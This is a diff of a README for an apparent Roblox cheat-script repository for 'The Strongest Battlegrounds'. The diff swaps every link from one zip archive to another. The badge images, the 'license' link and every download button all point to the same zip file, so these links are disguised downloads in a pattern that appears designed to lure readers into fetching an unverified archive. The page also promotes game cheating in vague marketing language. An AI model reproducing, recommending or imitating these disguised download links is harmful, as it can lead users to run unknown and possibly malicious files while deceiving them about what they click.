@@ -1,16 +1,16 @@
 # 🥇 NEW The Strongest Battlegrounds Script Roblox Repository
 
-![GitHub repo size](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)  
-![Contributions welcome](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)  
-![Maintenance](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)  
-![Release date](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)  
-![License: MIT](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)
+![GitHub repo size](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)  
+![Contributions welcome](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)  
+![Maintenance](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)  
+![Release date](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)  
+![License: MIT](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)
 
 Transform your Roblox experience with game-changing automation and scripts tailor-made for "The Strongest Battlegrounds". This repository assembles advanced gameplay tools, innovative features, and seamless integrations to create a robust scripting ecosystem for all levels of players and developers.
 
 ---
 
-[![Download](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)
+[![Download](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Our user-friendly installation flow will help you zoom into The Strongest Battle
 
 Hit the button below to download the latest version of the script and supporting files. This digital asset is distributed under our unique “Open Access Scripting Formula,” ensuring broad community benefit and agile updates.
 
-[![Download](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)
+[![Download](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)
 
 ### 3. **Installation**
 
@@ -116,7 +116,7 @@ This repository provides tools for educational and entertainment enhancement wit
 ## 📜 MIT License
 
 Licensed under the MIT License, 2025.  
-For permission details, see the full license [here](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip).
+For permission details, see the full license [here](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip).
 
 ---
 
@@ -124,7 +124,7 @@ For permission details, see the full license [here](https://github.com/factornin
 
 Thank you for exploring NEW The Strongest Battlegrounds Script Roblox! Ready to upgrade your battlegrounds? Secure your unique automation asset below.
 
-[![Download](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)](https://github.com/factornine/battlegrounds-script-roblox-enhanced/raw/refs/heads/branch/comfort/enhanced-battlegrounds-script-roblox-v1.2.zip)
+[![Download](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)](https://raw.githubusercontent.com/factornine/battlegrounds-script-roblox-enhanced/branch/comfort/script_roblox_battlegrounds_enhanced_v2.3.zip)
 
 ---
 
